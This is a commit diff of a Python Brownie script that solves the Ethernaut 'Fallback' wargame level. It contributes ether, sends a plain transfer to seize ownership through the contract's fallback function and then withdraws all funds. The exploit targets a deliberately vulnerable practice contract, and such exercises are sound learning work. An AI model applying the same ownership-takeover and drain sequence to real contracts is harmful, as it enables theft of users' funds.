32bc87615826ae01b71b4c032ca775862a9d0506
fahraday <ghosterinc@gmail.com>
2022-01-20 21:16:05 -0400

    finishig first solution

--- ethernaut_1_fallback/scripts/hacking.py
+++ ethernaut_1_fallback/scripts/hacking.py
@@ -1,14 +1,13 @@
 from brownie import interface, config, accounts, Contract
 from web3 import Web3
 
-CONTRACT_ADDRESS = "0xb97BFF7976b93FbF76004841B26A23c35E0509E6"
+CONTRACT_ADDRESS = "0xb9157a313c63A2dBAb3393aFf400F94EDC4ef1eA"
 ACCOUNT = accounts.add(config["wallets"]["from_key"])
 
 
 def contribute():
     fallback_contract = interface.Fallback(CONTRACT_ADDRESS)
 
-   
     contribute_tx = fallback_contract.contribute(
         {"from": ACCOUNT, "value": Web3.toWei(0.00002, "ether"), "gas_limit": 50000}
     )
@@ -19,14 +18,14 @@ def contribute():
 def hack():
     fallback_contract = interface.Fallback(CONTRACT_ADDRESS)
     print(Contract)
-    tx = ACCOUNT.transfer(fallback_contract.address,Web3.toWei(0.000002, "ether"))
+    tx = ACCOUNT.transfer(fallback_contract.address, Web3.toWei(0.000002, "ether"))
     tx.wait(1)
     print("Ownability stolen")
 
 
 def withdraw_all():
     fallback_contract = interface.Fallback(CONTRACT_ADDRESS)
-
+    print("Withdrawing the funds")
     tx = fallback_contract.withdraw({"from": ACCOUNT})
     print("All the money is withdrow")
     print("The contract has been hacked")
@@ -36,3 +35,5 @@ def main():
     contribute()
     hack()
     withdraw_all()
+
+
